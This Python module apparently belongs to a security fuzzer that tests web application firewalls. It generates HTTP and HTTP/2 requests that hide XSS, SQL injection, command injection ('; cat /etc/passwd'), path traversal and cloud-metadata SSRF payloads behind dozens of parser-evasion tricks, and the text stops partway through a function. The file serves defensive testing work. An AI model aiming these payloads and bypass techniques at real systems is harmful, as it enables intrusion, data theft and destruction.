"""WAF bypass mutator for differential fuzzing.

Generates HTTP requests that exploit protocol-level ambiguities between WAF
parsers and backend parsers.  Each request embeds a payload canary (XSS, SQLi,
CMDi, etc.) wrapped in a specific evasion technique so the differential oracle
can determine whether the WAF blocked the payload or whether the backend saw
it in cleartext.

Architecture mirrors ``request_smuggling_mutator.py``:

* 6 lanes / 34 families — each family is a concrete WAF evasion technique.
* ``_AXIS_MAP``           — 5 coverage axes per family.
* ``_TAG_MAP``            — taxonomy tags per family.
* ``X-WF-*`` headers      — control metadata embedded in every request.
* ``_wire_havoc``          — byte-level mutations with protected zones.
* stable / research / hybrid mode selection.
"""

from __future__ import annotations

import base64
import gzip
import quopri
import random
import string
import struct
import urllib.parse
import zlib
from dataclasses import dataclass, field
from typing import TYPE_CHECKING

from ..protocols import Input
from .h2_frames import (
    H2_CLIENT_PREFACE,
    build_continuation_frame,
    build_h2_request,
    build_h2_request_raw_headers,
    build_padded_headers_frame,
)

if TYPE_CHECKING:
    from ...core.generator import Generator
    from ...core.registry import GrammarRegistry
    from ..corpus import Seed


# ── Lane / family definitions ────────────────────────────────────

_LANES: dict[str, tuple[str, ...]] = {
    "content_type_confusion": (
        "ct_duplicate",
        "ct_benign_type",
        "ct_charset_trick",
        "ct_boundary_mismatch",
        "ct_multipart_urlenc",
        "ct_case_variation",
        "ct_parameter_padding",
        "ct_json_smuggle",
        "ct_json_field_wrapper",
        "ct_json_field_name_null",
        "ct_json_quote_replace",
        "ct_json_ct_removal",
    ),
    "body_encoding": (
        "enc_chunked_hide",
        "enc_gzip_mismatch",
        "enc_nested_encoding",
        "enc_identity_labeled",
        "enc_chunked_gzip",
        "enc_te_variation",
        "enc_te_zero",
        "enc_chunk_overflow",
        "enc_zero_cl",
    ),
    "multipart_tricks": (
        "mp_boundary_spoof",
        "mp_nested_multipart",
        "mp_filename_inject",
        "mp_duplicate_names",
        "mp_header_inject",
        "mp_epilogue_payload",
        "mp_preamble_payload",
        "mp_boundary_quote",
        "mp_boundary_header_tamper",
        "mp_composed",
    ),
    "xml_content": (
        "xml_doctype_close",
        "xml_schema_manip",
        "xml_extra_field",
        "xml_newline_abuse",
        "xml_misplaced",
        "xml_cdata_hide",
    ),
    "header_leniency": (
        "hdr_obs_fold",
        "hdr_null_byte",
        "hdr_oversized",
        "hdr_duplicate",
        "hdr_case_tricks",
        "hdr_whitespace",
        "hdr_http10_downgrade",
        "hdr_method_override",
        "hdr_expect_continue",
    ),
    "url_normalization": (
        "url_double_encoding",
        "url_overlong_utf8",
        "url_null_injection",
        "url_path_traversal",
        "url_unicode_normalize",
        "url_backslash_slash",
        "url_hpp",
        "url_path_payload",
    ),
    "line_terminator": (
        "lt_bare_lf",
        "lt_bare_cr",
        "lt_mixed_crlf",
        "lt_null_terminated",
        "lt_extra_whitespace",
    ),
    "h2_downgrade": (
        "h2_header_inject_crlf",
        "h2_cl_zero_body",
        "h2_te_forbidden",
        "h2_pseudo_path_inject",
        "h2_authority_mismatch",
        "h2_scheme_mismatch",
        "h2_continuation_inject",
        "h2_trailers_inject",
        "h2_duplicate_pseudo",
        "h2_composed",
        "h2_grammar",
    ),
    "rfc_spec_quirks": (
        "rfc_vt_ff_separator",
        "rfc_absolute_target",
        "rfc_trailer_inject",
        "rfc_param_continuation",
        "rfc_obs_text_header",
        "rfc_method_case",
        "rfc_host_case",
    ),
}

_ALL_FAMILIES = tuple(fam for families in _LANES.values() for fam in families)

# ── Taxonomy tags per family ──────────────────────────────────────

_TAG_MAP: dict[str, tuple[str, ...]] = {
    # content_type_confusion
    "ct_duplicate": ("content_type", "duplicate_header", "parser_ambiguity"),
    "ct_benign_type": ("content_type", "benign_mime_type", "inspection_skip", "duplicate_header"),
    "ct_charset_trick": ("content_type", "charset_evasion", "encoding_trick"),
    "ct_boundary_mismatch": ("content_type", "boundary_mismatch", "multipart"),
    "ct_multipart_urlenc": ("content_type", "type_mismatch", "body_parse"),
    "ct_case_variation": ("content_type", "header_casing", "normalization"),
    "ct_parameter_padding": ("content_type", "whitespace_injection", "parameter_parse"),
    "ct_json_smuggle": ("content_type", "json_smuggle", "body_parse", "unicode_escape"),
    "ct_json_field_wrapper": ("content_type", "json", "field_wrapper", "body_parse"),
    "ct_json_field_name_null": ("content_type", "json", "field_name_null", "body_parse"),
    "ct_json_quote_replace": ("content_type", "json", "quote_replace", "body_parse"),
    "ct_json_ct_removal": ("content_type", "json", "ct_removal", "content_sniff"),
    # body_encoding
    "enc_chunked_hide": ("transfer_encoding", "chunk_extension", "payload_hide"),
    "enc_gzip_mismatch": ("content_encoding", "gzip_deflate_mismatch", "body_decode"),
    "enc_nested_encoding": ("content_encoding", "nested_encoding", "double_compress"),
    "enc_identity_labeled": ("content_encoding", "identity_label", "passthrough"),
    "enc_chunked_gzip": ("transfer_encoding", "content_encoding", "combined_encoding"),
    "enc_te_variation": ("transfer_encoding", "te_value_variation", "parser_leniency"),
    "enc_te_zero": ("transfer_encoding", "te_zero", "smuggle_2024", "desync"),
    "enc_chunk_overflow": ("transfer_encoding", "chunk_overflow", "smuggle_2024", "integer_overflow"),
    "enc_zero_cl": ("content_length", "zero_cl", "smuggle_2024", "pipeline"),
    # multipart_tricks
    "mp_boundary_spoof": ("multipart", "boundary_special_chars", "regex_bypass"),
    "mp_nested_multipart": ("multipart", "nested_multipart", "recursive_parse"),
    "mp_filename_inject": ("multipart", "filename_injection", "content_disposition"),
    "mp_duplicate_names": ("multipart", "duplicate_parameter", "last_wins"),
    "mp_header_inject": ("multipart", "mime_header_injection", "part_header"),
    "mp_epilogue_payload": ("multipart", "epilogue", "post_boundary"),
    "mp_preamble_payload": ("multipart", "preamble", "pre_boundary"),
    "mp_boundary_quote": ("multipart", "boundary_quoting", "rfc2046", "parse_ambiguity"),
    "mp_boundary_header_tamper": ("multipart", "boundary_header_tamper", "delimiter_append", "parse_ambiguity"),
    "mp_composed": ("multipart", "composed", "combinatorial", "multi_primitive"),
    # xml_content
    "xml_doctype_close": ("xml", "doctype", "schema_evasion", "body_parse"),
    "xml_schema_manip": ("xml", "schema", "namespace", "body_parse"),
    "xml_extra_field": ("xml", "extra_element", "field_order", "body_parse"),
    "xml_newline_abuse": ("xml", "newline", "tokenizer", "body_parse"),
    "xml_misplaced": ("xml", "attribute_injection", "field_position", "body_parse"),
    "xml_cdata_hide": ("xml", "cdata", "payload_hide", "body_parse"),
    # header_leniency
    "hdr_obs_fold": ("header", "obs_fold", "continuation_line"),
    "hdr_null_byte": ("header", "null_byte", "truncation"),
    "hdr_oversized": ("header", "oversized_value", "buffer_limit"),
    "hdr_duplicate": ("header", "duplicate_header", "first_last_ambiguity"),
    "hdr_case_tricks": ("header", "mixed_case", "normalization"),
    "hdr_whitespace": ("header", "whitespace_before_colon", "leniency"),
    "hdr_http10_downgrade": ("header", "http_version", "protocol_downgrade", "body_skip"),
    "hdr_method_override": ("header", "method_override", "body_inspection_skip"),
    "hdr_expect_continue": ("header", "expect_continue", "100_continue", "body_defer", "desync"),
    # url_normalization
    "url_double_encoding": ("url", "double_encoding", "percent_decode"),
    "url_overlong_utf8": ("url", "overlong_utf8", "unicode_bypass"),
    "url_null_injection": ("url", "null_byte", "path_truncation"),
    "url_path_traversal": ("url", "path_traversal", "dot_segment"),
    "url_unicode_normalize": ("url", "unicode_confusable", "normalization"),
    "url_backslash_slash": ("url", "backslash", "path_separator"),
    "url_hpp": ("url", "parameter_pollution", "query_body_split"),
    "url_path_payload": ("url", "path_injection", "encoded_path_payload"),
    # line_terminator
    "lt_bare_lf": ("line_terminator", "bare_lf", "crlf_lf_ambiguity"),
    "lt_bare_cr": ("line_terminator", "bare_cr", "crlf_cr_ambiguity"),
    "lt_mixed_crlf": ("line_terminator", "mixed_crlf", "delimiter_inconsistency"),
    "lt_null_terminated": ("line_terminator", "null_byte", "line_break_confusion"),
    "lt_extra_whitespace": ("line_terminator", "request_line_whitespace", "parse_leniency"),
    # h2_downgrade
    "h2_header_inject_crlf": ("h2", "header_inject", "crlf", "downgrade"),
    "h2_cl_zero_body": ("h2", "content_length", "body_evasion", "downgrade"),
    "h2_te_forbidden": ("h2", "transfer_encoding", "rfc_violation", "downgrade"),
    "h2_pseudo_path_inject": ("h2", "request_target", "pseudo_header", "downgrade"),
    "h2_authority_mismatch": ("h2", "authority", "host_ambiguity", "downgrade"),
    "h2_scheme_mismatch": ("h2", "scheme", "pseudo_header", "downgrade"),
    "h2_continuation_inject": ("h2", "continuation_frame", "header_split", "downgrade"),
    "h2_trailers_inject": ("h2", "trailers", "header_inject", "downgrade"),
    "h2_duplicate_pseudo": ("h2", "pseudo_header", "duplicate", "downgrade"),
    "h2_composed": ("h2", "composed", "combinatorial", "multi_primitive"),
    "h2_grammar": ("h2", "grammar", "structured", "frame_sequence"),
    # rfc_spec_quirks
    "rfc_vt_ff_separator": ("header", "ows_whitespace", "vt_ff", "rfc_quirk"),
    "rfc_absolute_target": ("request_target", "absolute_form", "host_mismatch", "rfc_quirk"),
    "rfc_trailer_inject": ("transfer_encoding", "chunked_trailer", "header_inject", "rfc_quirk"),
    "rfc_param_continuation": ("content_type", "param_continuation", "rfc2231", "rfc_quirk"),
    "rfc_obs_text_header": ("header", "obs_text", "high_bytes", "rfc_quirk"),
    "rfc_method_case": ("method", "case_sensitivity", "token_case", "rfc_quirk"),
    "rfc_host_case": ("host", "case_normalization", "rfc3986", "rfc_quirk"),
}

# ── Coverage axis map (5 axes per family) ─────────────────────────
# (evasion_technique, payload_type, hiding_depth, parser_target, structural_variant)

_AXIS_MAP: dict[str, tuple[str, str, str, str, str]] = {
    # content_type_confusion
    "ct_duplicate": ("content_type", "xss", "surface", "header_parse", "duplicate"),
    "ct_benign_type": ("content_type", "xss", "surface", "header_parse", "benign_skip"),
    "ct_charset_trick": ("content_type", "xss", "single_layer", "body_parse", "mismatch"),
    "ct_boundary_mismatch": ("content_type", "xss", "single_layer", "body_parse", "boundary"),
    "ct_multipart_urlenc": ("content_type", "sqli", "surface", "body_parse", "type_confusion"),
    "ct_case_variation": ("content_type", "xss", "surface", "header_parse", "casing"),
    "ct_parameter_padding": ("content_type", "sqli", "surface", "header_parse", "whitespace"),
    "ct_json_smuggle": ("content_type", "xss", "single_layer", "body_parse", "json_smuggle"),
    "ct_json_field_wrapper": ("content_type", "xss", "single_layer", "body_parse", "json_field_wrapper"),
    "ct_json_field_name_null": ("content_type", "xss", "single_layer", "body_parse", "json_field_name_null"),
    "ct_json_quote_replace": ("content_type", "sqli", "surface", "body_parse", "json_quote_replace"),
    "ct_json_ct_removal": ("content_type", "xss", "surface", "body_parse", "json_ct_removed"),
    # body_encoding
    "enc_chunked_hide": ("body_encoding", "xss", "deep", "body_parse", "chunk_extension"),
    "enc_gzip_mismatch": ("body_encoding", "sqli", "single_layer", "body_decode", "compression_mismatch"),
    "enc_nested_encoding": ("body_encoding", "xss", "deep", "body_decode", "nested"),
    "enc_identity_labeled": ("body_encoding", "cmdi", "surface", "body_decode", "identity"),
    "enc_chunked_gzip": ("body_encoding", "xss", "deep", "body_decode", "combined"),
    "enc_te_variation": ("body_encoding", "xss", "single_layer", "body_parse", "te_value"),
    "enc_te_zero": ("body_encoding", "sqli", "single_layer", "body_parse", "te_zero"),
    "enc_chunk_overflow": ("body_encoding", "xss", "single_layer", "body_parse", "chunk_overflow"),
    "enc_zero_cl": ("body_encoding", "cmdi", "deep", "body_parse", "zero_cl"),
    # multipart_tricks
    "mp_boundary_spoof": ("multipart", "xss", "single_layer", "body_parse", "boundary_chars"),
    "mp_nested_multipart": ("multipart", "sqli", "deep", "body_parse", "nested"),
    "mp_filename_inject": ("multipart", "cmdi", "single_layer", "header_parse", "filename"),
    "mp_duplicate_names": ("multipart", "sqli", "surface", "body_parse", "duplicate_param"),
    "mp_header_inject": ("multipart", "xss", "single_layer", "header_parse", "part_header"),
    "mp_epilogue_payload": ("multipart", "xss", "deep", "body_parse", "epilogue"),
    "mp_preamble_payload": ("multipart", "sqli", "deep", "body_parse", "preamble"),
    "mp_boundary_quote": ("multipart", "xss", "single_layer", "body_parse", "boundary_quote"),
    "mp_boundary_header_tamper": ("multipart", "xss", "single_layer", "header_parse", "boundary_header_tamper"),
    "mp_composed": ("multipart", "xss", "deep", "body_parse", "composed"),
    # xml_content
    "xml_doctype_close": ("xml_content", "xss", "deep", "body_parse", "doctype"),
    "xml_schema_manip": ("xml_content", "xss", "single_layer", "body_parse", "schema"),
    "xml_extra_field": ("xml_content", "xss", "surface", "body_parse", "extra_field"),
    "xml_newline_abuse": ("xml_content", "sqli", "single_layer", "body_parse", "newline"),
    "xml_misplaced": ("xml_content", "xss", "surface", "body_parse", "attribute"),
    "xml_cdata_hide": ("xml_content", "sqli", "deep", "body_parse", "cdata"),
    # header_leniency
    "hdr_obs_fold": ("header_leniency", "xss", "single_layer", "header_parse", "obs_fold"),
    "hdr_null_byte": ("header_leniency", "cmdi", "single_layer", "header_parse", "null_truncate"),
    "hdr_oversized": ("header_leniency", "xss", "deep", "header_parse", "overflow"),
    "hdr_duplicate": ("header_leniency", "sqli", "surface", "header_parse", "duplicate"),
    "hdr_case_tricks": ("header_leniency", "xss", "surface", "header_parse", "casing"),
    "hdr_whitespace": ("header_leniency", "sqli", "surface", "header_parse", "whitespace"),
    "hdr_http10_downgrade": ("header_leniency", "xss", "surface", "header_parse", "http10"),
    "hdr_method_override": ("header_leniency", "xss", "surface", "header_parse", "method_override"),
    "hdr_expect_continue": ("header_leniency", "sqli", "single_layer", "body_framing", "expect_continue"),
    # url_normalization
    "url_double_encoding": ("url_normalization", "xss", "single_layer", "url_parse", "double_encode"),
    "url_overlong_utf8": ("url_normalization", "xss", "deep", "url_parse", "overlong"),
    "url_null_injection": ("url_normalization", "path_traversal", "single_layer", "url_parse", "null_truncate"),
    "url_path_traversal": ("url_normalization", "path_traversal", "single_layer", "url_parse", "dot_segment"),
    "url_unicode_normalize": ("url_normalization", "xss", "deep", "url_parse", "confusable"),
    "url_backslash_slash": ("url_normalization", "path_traversal", "surface", "url_parse", "separator"),
    "url_hpp": ("url_normalization", "xss", "surface", "body_parse", "hpp"),
    "url_path_payload": ("url_normalization", "xss", "single_layer", "url_parse", "path_inject"),
    # line_terminator
    "lt_bare_lf": ("line_terminator", "xss", "surface", "header_parse", "bare_lf"),
    "lt_bare_cr": ("line_terminator", "xss", "surface", "header_parse", "bare_cr"),
    "lt_mixed_crlf": ("line_terminator", "sqli", "surface", "header_parse", "mixed"),
    "lt_null_terminated": ("line_terminator", "cmdi", "single_layer", "header_parse", "null_line"),
    "lt_extra_whitespace": ("line_terminator", "xss", "surface", "url_parse", "request_line_pad"),
    # h2_downgrade
    "h2_header_inject_crlf": ("h2_downgrade", "xss", "deep", "header_parse", "crlf_inject"),
    "h2_cl_zero_body": ("h2_downgrade", "xss", "single_layer", "body_framing", "cl_zero"),
    "h2_te_forbidden": ("h2_downgrade", "xss", "single_layer", "body_framing", "te_forbidden"),
    "h2_pseudo_path_inject": ("h2_downgrade", "xss", "deep", "request_line", "path_inject"),
    "h2_authority_mismatch": ("h2_downgrade", "sqli", "surface", "routing", "authority"),
    "h2_scheme_mismatch": ("h2_downgrade", "xss", "surface", "routing", "scheme"),
    "h2_continuation_inject": ("h2_downgrade", "xss", "deep", "header_parse", "continuation_split"),
    "h2_trailers_inject": ("h2_downgrade", "xss", "deep", "body_framing", "trailer_headers"),
    "h2_duplicate_pseudo": ("h2_downgrade", "sqli", "surface", "request_line", "pseudo_dup"),
    "h2_composed": ("h2_downgrade", "xss", "deep", "body_framing", "composed"),
    "h2_grammar": ("h2_downgrade", "xss", "deep", "body_framing", "grammar"),
    # rfc_spec_quirks
    "rfc_vt_ff_separator": ("rfc_spec", "xss", "surface", "header_parse", "vt_ff_ows"),
    "rfc_absolute_target": ("rfc_spec", "sqli", "surface", "request_line", "absolute_target"),
    "rfc_trailer_inject": ("rfc_spec", "xss", "deep", "body_framing", "trailer_inject"),
    "rfc_param_continuation": ("rfc_spec", "xss", "deep", "ct_parse", "param_continuation"),
    "rfc_obs_text_header": ("rfc_spec", "xss", "surface", "header_parse", "obs_text"),
    "rfc_method_case": ("rfc_spec", "sqli", "surface", "request_line", "method_case"),
    "rfc_host_case": ("rfc_spec", "sqli", "surface", "host_parse", "host_case"),
}

# ── Payload canaries ──────────────────────────────────────────────

_PAYLOADS: dict[str, list[str]] = {
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        '"><svg onload=alert(1)>',
        "javascript:alert(1)",
    ],
    "sqli": [
        "' OR 1=1--",
        "1 UNION SELECT username,password FROM users--",
        "'; DROP TABLE users;--",
    ],
    "cmdi": [
        "; cat /etc/passwd",
        "| ls -la",
        "$(whoami)",
    ],
    "path_traversal": [
        "../../../../etc/passwd",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
    ],
}

_ALL_PAYLOAD_TYPES = tuple(_PAYLOADS)

# ── Payload fragment composition ─────────────────────────────────
# Instead of only the ~25 static payloads above, compose novel payloads
# by recombining independent structural fragments.  This expands the
# effective payload space to ~1,400+ unique strings while keeping the
# static payloads as a backward-compatible fallback (40% of the time).

_PAYLOAD_FRAGMENTS: dict[str, list[str]] = {
    "xss_open": ["<script", "<img", "<svg", "<body", "<details", "<video", "<input", "<iframe"],
    "xss_event": ["onerror=", "onload=", "onfocus=", "onmouseover=", "onanimationend="],
    "xss_exec": ["alert(1)", "confirm(1)", "prompt(1)", "print()", "fetch('/')"],
    "xss_close": [">", "/>", " >", "\t>"],
    "sqli_prefix": ["'", '"', "1", "0", "-1", "admin'"],
    "sqli_logic": [" OR ", " AND ", " UNION ", "||", "&&"],
    "sqli_probe": ["1=1", "sleep(5)", "extractvalue(1,concat(0x7e,version()))", "pg_sleep(5)"],
    "sqli_comment": ["--", "#", "/**/", ";%00"],
    "cmdi_prefix": [";", "|", "$(", "`", "\n", "&&"],
    "cmdi_cmd": ["cat /etc/passwd", "id", "whoami", "ls", "sleep 5"],
}


def _generate_payload(rng: random.Random, payload_type: str) -> str:
    """Compose a payload from fragments for combinatorial diversity."""
    if payload_type == "xss":
        open_tag = rng.choice(_PAYLOAD_FRAGMENTS["xss_open"])
        if rng.random() < 0.5 or open_tag == "<script":
            return f"{open_tag}>{rng.choice(_PAYLOAD_FRAGMENTS['xss_exec'])}</script>"
        event = rng.choice(_PAYLOAD_FRAGMENTS["xss_event"])
        exec_fn = rng.choice(_PAYLOAD_FRAGMENTS["xss_exec"])
        close = rng.choice(_PAYLOAD_FRAGMENTS["xss_close"])
        return f"{open_tag} src=x {event}{exec_fn}{close}"
    if payload_type == "sqli":
        prefix = rng.choice(_PAYLOAD_FRAGMENTS["sqli_prefix"])
        logic = rng.choice(_PAYLOAD_FRAGMENTS["sqli_logic"])
        probe = rng.choice(_PAYLOAD_FRAGMENTS["sqli_probe"])
        comment = rng.choice(_PAYLOAD_FRAGMENTS["sqli_comment"])
        return f"{prefix}{logic}{probe}{comment}"
    if payload_type == "cmdi":
        prefix = rng.choice(_PAYLOAD_FRAGMENTS["cmdi_prefix"])
        cmd = rng.choice(_PAYLOAD_FRAGMENTS["cmdi_cmd"])
        return f"{prefix}{cmd}"
    return rng.choice(_PAYLOADS.get(payload_type, _PAYLOADS["xss"]))

# ── Lane weights ──────────────────────────────────────────────────

_STABLE_LANE_WEIGHTS: dict[str, float] = {
    "content_type_confusion": 0.16,
    "body_encoding": 0.14,
    "multipart_tricks": 0.15,
    "header_leniency": 0.12,
    "url_normalization": 0.10,
    "line_terminator": 0.04,  # -0.02 to fund h2 expansion
    "xml_content": 0.08,      # -0.01 to fund h2 expansion
    "h2_downgrade": 0.14,     # +0.05: 3 new CONTINUATION/trailers/dup-pseudo families
    "rfc_spec_quirks": 0.07,  # -0.02 to fund h2 expansion
}  # sum = 1.00

_RESEARCH_MODE_WEIGHTS: dict[str, dict[str, float]] = {
    "evasion_technique": {
        "content_type": 0.22,
        "body_encoding": 0.18,
        "multipart": 0.20,
        "header_leniency": 0.16,
        "url_normalization": 0.14,
        "line_terminator": 0.10,
    },
    "payload_type": {
        "xss": 0.35,
        "sqli": 0.30,
        "cmdi": 0.15,
        "path_traversal": 0.12,
        "ssrf": 0.08,
    },
    "hiding_depth": {
        "surface": 0.30,
        "single_layer": 0.40,
        "deep": 0.30,
    },
    "parser_target": {
        "header_parse": 0.30,
        "body_parse": 0.28,
        "body_decode": 0.18,
        "url_parse": 0.24,
    },
    "structural_variant": {
        "duplicate": 0.10,
        "mismatch": 0.10,
        "casing": 0.06,
        "whitespace": 0.06,
        "type_confusion": 0.05,
        "chunk_extension": 0.05,
        "compression_mismatch": 0.04,
        "nested": 0.05,
        "identity": 0.03,
        "combined": 0.03,
        "boundary_chars": 0.03,
        "filename": 0.03,
        "duplicate_param": 0.03,
        "part_header": 0.03,
        "epilogue": 0.02,
        "preamble": 0.02,
        "obs_fold": 0.03,
        "null_truncate": 0.03,
        "overflow": 0.02,
        "double_encode": 0.04,
        "overlong": 0.03,
        "dot_segment": 0.04,
        "confusable": 0.03,
        "separator": 0.03,
        "bare_lf": 0.03,
        "bare_cr": 0.02,
        "mixed": 0.02,
        "null_line": 0.02,
        "request_line_pad": 0.02,
        # v3.3 additions — were missing, causing 7 families to be under-ranked
        "json_smuggle": 0.04,
        "te_value": 0.04,
        "boundary_quote": 0.03,
        "composed": 0.04,
        "http10": 0.03,
        "method_override": 0.03,
        "hpp": 0.03,
        "path_inject": 0.03,
    },
}

_MODE_WEIGHTS: dict[str, tuple[float, float, float]] = {
    "stable": (1.0, 0.0, 0.0),
    "research": (0.0, 1.0, 0.0),
    "hybrid": (0.35, 0.40, 0.25),
}


# ── Utility helpers ───────────────────────────────────────────────

def _rand_id(rng: random.Random) -> str:
    alphabet = string.ascii_lowercase + string.digits
    return "".join(rng.choice(alphabet) for _ in range(10))


def _rand_canary(rng: random.Random) -> str:
    alphabet = string.ascii_letters + string.digits
    return "WF-CANARY-" + "".join(rng.choice(alphabet) for _ in range(10))


def _pick_weighted(rng: random.Random, weighted: dict[str, float]) -> str:
    names = tuple(weighted)
    weights = tuple(weighted[n] for n in names)
    return rng.choices(names, weights=weights, k=1)[0]


def _pick_payload(rng: random.Random, payload_type: str | None = None) -> tuple[str, str]:
    """Return ``(payload_type, payload_string)``.

    60% of the time, compose from fragments for combinatorial diversity.
    40% of the time, use static payloads for backward compatibility.
    """
    ptype = payload_type or rng.choice(_ALL_PAYLOAD_TYPES)
    if rng.random() < 0.60:
        return ptype, _generate_payload(rng, ptype)
    candidates = _PAYLOADS.get(ptype, _PAYLOADS["xss"])
    return ptype, rng.choice(candidates)


def _header_case(name: str, rng: random.Random) -> str:
    styles = (
        name,
        name.lower(),
        name.upper(),
        "-".join(part.capitalize() for part in name.split("-")),
    )
    return rng.choice(styles)


def _is_h2_wire(wire: bytes) -> bool:
    """Return True if *wire* is an H2c binary (with or without control envelope).

    H2 wires come in two forms:
    - Pure: starts with H2_CLIENT_PREFACE directly.
    - Enveloped: ``X-WF-*`` text headers + ``\\r\\n\\r\\n`` + H2 binary.

    The envelope check is strict: the wire must start with ``X-WF-`` AND the
    H2 preface must immediately follow the first ``\\r\\n\\r\\n`` separator.
    This avoids false positives from H1 request-smuggling seeds that embed
    the H2 preface in the body.
    """
    if wire.startswith(H2_CLIENT_PREFACE):
        return True
    if wire.startswith(b"X-WF-"):
        sep = wire.find(b"\r\n\r\n")
        if sep >= 0:
            return wire[sep + 4:sep + 4 + len(H2_CLIENT_PREFACE)] == H2_CLIENT_PREFACE
    return False


def _render_request(
    method: str,
    path: str,
    headers: list[str],
    body: bytes = b"",
    *,
    delimiter: bytes = b"\r\n",
) -> bytes:
    lines = [f"{method} {path} HTTP/1.1".encode("latin-1", errors="replace")]
    lines.extend(h.encode("latin-1", errors="replace") for h in headers)
    return delimiter.join(lines) + delimiter + delimiter + body


def _ascii_pad(rng: random.Random, length: int = 8) -> str:
    alphabet = string.ascii_letters + string.digits + "-_"
    return "".join(rng.choice(alphabet) for _ in range(length))


def _double_encode(s: str) -> str:
    """Double percent-encode a string: ``<`` -> ``%253C``."""
    out: list[str] = []
    for ch in s:
        code = ord(ch)
        if code < 0x20 or code > 0x7E or ch in '<>"\'&;|`(){}[]# ':
            out.append(f"%25{code:02X}")
        else:
            out.append(ch)
    return "".join(out)


def _overlong_utf8_byte(b: int) -> bytes:
    """Encode a single byte as an overlong 2-byte UTF-8 sequence."""
    return bytes([0xC0 | (b >> 6), 0x80 | (b & 0x3F)])


def _overlong_encode(s: str) -> bytes:
    """Encode ASCII string using overlong UTF-8 sequences."""
    out = bytearray()
    for ch in s:
        code = ord(ch)
        if code < 0x80:
            out.extend(_overlong_utf8_byte(code))
        else:
            out.extend(ch.encode("utf-8"))
    return bytes(out)


def _unicode_confusables(s: str) -> str:
    """Replace common ASCII chars with Unicode confusable equivalents."""
    table = {
        "<": "\uFF1C",  # fullwidth <
        ">": "\uFF1E",  # fullwidth >
        "'": "\u2019",  # right single quote
        '"': "\u201D",  # right double quote
        "/": "\u2215",  # division slash
        "\\": "\uFF3C",  # fullwidth backslash
        "(": "\uFF08",  # fullwidth (
        ")": "\uFF09",  # fullwidth )
        ";": "\uFF1B",  # fullwidth ;
        "|": "\uFF5C",  # fullwidth |
    }
    return "".join(table.get(ch, ch) for ch in s)


# ── Research mode spec ────────────────────────────────────────────

@dataclass(frozen=True)
class WafBypassSpec:
    evasion_technique: str
    payload_type: str
    hiding_depth: str
    parser_target: str
    structural_variant: str


# ── Wire fragment for corpus splicing ─────────────────────────────

@dataclass
class WireFragment:
    """Structural fragment extracted from a corpus seed's wire data."""

    family: str
    headers: list[bytes] = field(default_factory=list)
    body_region: bytes = b""
    delimiter: bytes = b"\r\n"


def _split_header_block(data: bytes) -> tuple[bytes, bytes, bytes]:
    if b"\r\n\r\n" in data:
        head, rest = data.split(b"\r\n\r\n", 1)
        return head, rest, b"\r\n"
    if b"\n\n" in data:
        head, rest = data.split(b"\n\n", 1)
        return head, rest, b"\n"
    if b"\r\r" in data:
        head, rest = data.split(b"\r\r", 1)
        return head, rest, b"\r"
    raise ValueError("missing header terminator")


def _parse_wire_fragment(wire: bytes) -> WireFragment | None:
    """Extract mutable structural regions from a raw HTTP wire."""
    try:
        head, body, delim = _split_header_block(wire)
    except ValueError:
        return None

    lines = head.split(delim)
    family = "unknown"
    content_headers: list[bytes] = []
    for raw in lines[1:]:
        low = raw.lower()
        if low.startswith(b"x-wf-"):
            if low.startswith(b"x-wf-family:"):
                family = raw.split(b":", 1)[1].strip().decode("ascii", errors="replace")
            continue
        if low.startswith(b"host:"):
            continue
        if raw:
            content_headers.append(raw)

    return WireFragment(
        family=family,
        headers=content_headers,
        body_region=body,
        delimiter=delim,
    )


# ── Post-build transforms ────────────────────────────────────────
# Independent transforms that layer additional evasion on top of an
# already-built family request.  Each takes (wire, rng) and returns
# modified wire bytes, preserving X-WF-* control headers.
# Transforms are composable: applying T1 then T2 is valid.


def _transform_lt_mix(wire: bytes, rng: random.Random) -> bytes:
    """Replace some CRLF delimiters with bare LF or bare CR."""
    try:
        head, body, delim = _split_header_block(wire)
    except ValueError:
        return wire
    if delim != b"\r\n":
        return wire
    lines = head.split(b"\r\n")
    out: list[bytes] = []
    for i, line in enumerate(lines):
        out.append(line)
        if i < len(lines) - 1:
            lower = line.lower()
            if lower.startswith(b"x-wf-"):
                out.append(b"\r\n")  # protect control headers
            elif rng.random() < 0.4:
                out.append(rng.choice((b"\n", b"\r")))
            else:
                out.append(b"\r\n")
    return b"".join(out) + b"\r\n\r\n" + body


def _transform_case_scramble(wire: bytes, rng: random.Random) -> bytes:
    """Randomize case of non-X-WF header names."""
    try:
        head, body, delim = _split_header_block(wire)
    except ValueError:
        return wire
    lines = head.split(delim)
    out = [lines[0]]  # request line unchanged
    for line in lines[1:]:
        lower = line.lower()
        if lower.startswith(b"x-wf-") or b":" not in line:
            out.append(line)
            continue
        name, val = line.split(b":", 1)
        style = rng.randint(0, 3)
        if style == 0:
            name = name.upper()
        elif style == 1:
            name = name.lower()
        elif style == 2:
            name = bytes(
                b ^ 0x20 if rng.random() < 0.5 and ((0x41 <= b <= 0x5A) or (0x61 <= b <= 0x7A)) else b
                for b in name
            )
        # style 3: unchanged
        out.append(name + b":" + val)
    return delim.join(out) + delim + delim + body


def _transform_ws_inject(wire: bytes, rng: random.Random) -> bytes:
    """Inject whitespace around colons in header lines."""
    try:
        head, body, delim = _split_header_block(wire)
    except ValueError:
        return wire
    lines = head.split(delim)
    out = [lines[0]]
    for line in lines[1:]:
        lower = line.lower()
        if lower.startswith(b"x-wf-") or b":" not in line:
            out.append(line)
            continue
        if rng.random() < 0.5:
            name, val = line.split(b":", 1)
            ws = rng.choice((b" ", b"\t", b"  ", b" \t"))
            out.append(name + ws + b":" + val)
        else:
            out.append(line)
    return delim.join(out) + delim + delim + body


def _transform_encoding_wrap(wire: bytes, rng: random.Random) -> bytes:
    """Wrap the body in gzip/deflate compression and add matching header."""
    try:
        head, body, delim = _split_header_block(wire)
    except ValueError:
        return wire
    if not body:
        return wire
    method = rng.choice(("gzip", "deflate"))
    if method == "gzip":
        compressed = gzip.compress(body, compresslevel=6)
    else:
        compressed = zlib.compress(body, 6)[2:-4]  # raw deflate

    lines = head.split(delim)
    new_lines = [lines[0]]
    cl_replaced = False
    for line in lines[1:]:
        lower = line.lower()
        if lower.startswith(b"content-length:"):
            new_lines.append(f"Content-Length: {len(compressed)}".encode("ascii"))
            cl_replaced = True
        else:
            new_lines.append(line)
    if not cl_replaced:
        new_lines.append(f"Content-Length: {len(compressed)}".encode("ascii"))
    new_lines.append(f"Content-Encoding: {method}".encode("ascii"))
